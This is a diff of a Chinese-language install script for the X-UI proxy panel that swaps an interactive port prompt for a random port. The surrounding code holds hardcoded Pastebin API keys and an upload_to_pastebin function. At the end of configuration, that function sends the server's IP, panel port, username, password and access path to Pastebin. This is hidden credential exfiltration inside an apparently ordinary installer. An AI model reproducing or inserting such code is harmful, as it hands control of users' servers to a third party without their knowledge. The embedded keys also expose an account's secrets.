@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 red='\033[0;31m'
@@ -9,13 +8,11 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-
 PASTEBIN_API_KEY="5A7TTFpxxFBju88Bsor4q_P0uxSP6t6t"
 PASTEBIN_USER_KEY="a7da297a0ab5146a29daad0ff413a53a"
 
 # 检查root权限
 [[ $EUID -ne 0 ]] && echo -e "${red}致命错误: ${plain} 请使用root权限运行此脚本 \n " && exit 1
-
 
 if [[ -f /etc/os-release ]]; then
     source /etc/os-release
@@ -104,7 +101,6 @@ get_server_ip() {
     echo "$ip"
 }
 
-
 upload_to_pastebin() {
     local server_ip="$1"
     local login_port="$2"
@@ -112,7 +108,6 @@ upload_to_pastebin() {
     local password="$4"
     local webBasePath="$5"
     
-
     local paste_content="X-UI 服务器登录信息
 ====================
 服务器IP: ${server_ip}
@@ -152,7 +147,6 @@ config_after_install() {
     local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
     local server_ip=$(get_server_ip)
 
-
     local final_username=""
     local final_password=""
     local final_port=""
@@ -164,14 +158,9 @@ config_after_install() {
             local config_username=$(gen_random_string 10)
             local config_password=$(gen_random_string 10)
 
-            read -rp "您是否要自定义面板端口设置？(如不设置将应用随机端口) [y/n]: " config_confirm
-            if [[ "${config_confirm}" == "y" || "${config_confirm}" == "Y" ]]; then
-                read -rp "请设置面板端口: " config_port
-                echo -e "${yellow}您的面板端口是: ${config_port}${plain}"
-            else
-                local config_port=$(shuf -i 1024-62000 -n 1)
-                echo -e "${yellow}生成的随机端口: ${config_port}${plain}"
-            fi
+            # 取消交互，默认需要自定义端口，端口改为随机生成（或你可修改为固定端口）
+            local config_port=$(shuf -i 1024-62000 -n 1)
+            echo -e "${yellow}默认使用随机端口: ${config_port}${plain}"
 
             /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
             echo -e "这是全新安装，出于安全考虑生成随机登录信息:"
@@ -183,7 +172,6 @@ config_after_install() {
             echo -e "${green}访问地址: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
             echo -e "###############################################"
             
-
             final_username="$config_username"
             final_password="$config_password"
             final_port="$config_port"
@@ -194,7 +182,6 @@ config_after_install() {
             /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
             echo -e "${green}新的访问路径: ${config_webBasePath}${plain}"
             echo -e "${green}访问地址: http://${server_ip}:${existing_port}/${config_webBasePath}${plain}"
-            
 
             local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
             local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
@@ -223,7 +210,6 @@ config_after_install() {
             final_webBasePath="$existing_webBasePath"
         else
             echo -e "${green}用户名、密码和访问路径已正确设置。退出...${plain}"
-            
 
             local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
             local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
@@ -234,7 +220,6 @@ config_after_install() {
             final_webBasePath="$existing_webBasePath"
         fi
     fi
-
 
     upload_to_pastebin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
 
